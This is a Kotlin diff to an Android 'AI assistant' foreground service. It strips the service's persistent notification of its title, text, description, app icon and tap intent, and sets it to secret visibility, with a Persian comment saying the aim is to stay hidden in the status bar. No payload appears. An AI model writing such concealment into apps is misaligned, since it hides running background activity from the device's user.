@@ -43,13 +43,14 @@ class AIAssistantService : Service() {
             val channel = NotificationChannel(
                 CHANNEL_ID,
                 CHANNEL_NAME,
-                NotificationManager.IMPORTANCE_MIN  // کمترین اهمیت = بدون صدا، بدون نمایش
+                NotificationManager.IMPORTANCE_LOW  // LOW برای مخفی بودن در status bar
             ).apply {
-                description = "سرویس دستیار هوش مصنوعی"
+                description = ""
                 setShowBadge(false)
                 enableLights(false)
                 enableVibration(false)
                 setSound(null, null)
+                lockscreenVisibility = Notification.VISIBILITY_SECRET
             }
 
             val notificationManager = getSystemService(NotificationManager::class.java)
@@ -58,23 +59,16 @@ class AIAssistantService : Service() {
     }
 
     private fun createNotification(): Notification {
-        val notificationIntent = Intent(this, MainActivity::class.java)
-        val pendingIntent = PendingIntent.getActivity(
-            this,
-            0,
-            notificationIntent,
-            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
-        )
-
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("")  // بدون عنوان
-            .setContentText("")   // بدون متن
-            .setSmallIcon(R.drawable.ic_notification)
-            .setContentIntent(pendingIntent)
+            .setContentTitle("")
+            .setContentText("")
+            .setSmallIcon(android.R.drawable.ic_dialog_info)  // آیکون سیستمی کوچک
+            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+            .setShowWhen(false)
+            .setSilent(true)
             .setOngoing(true)
-            .setPriority(NotificationCompat.PRIORITY_MIN)  // کمترین اولویت
-            .setVisibility(NotificationCompat.VISIBILITY_SECRET)  // مخفی
-            .setSilent(true)  // بدون صدا
+            .setCategory(Notification.CATEGORY_SERVICE)
             .build()
     }
 
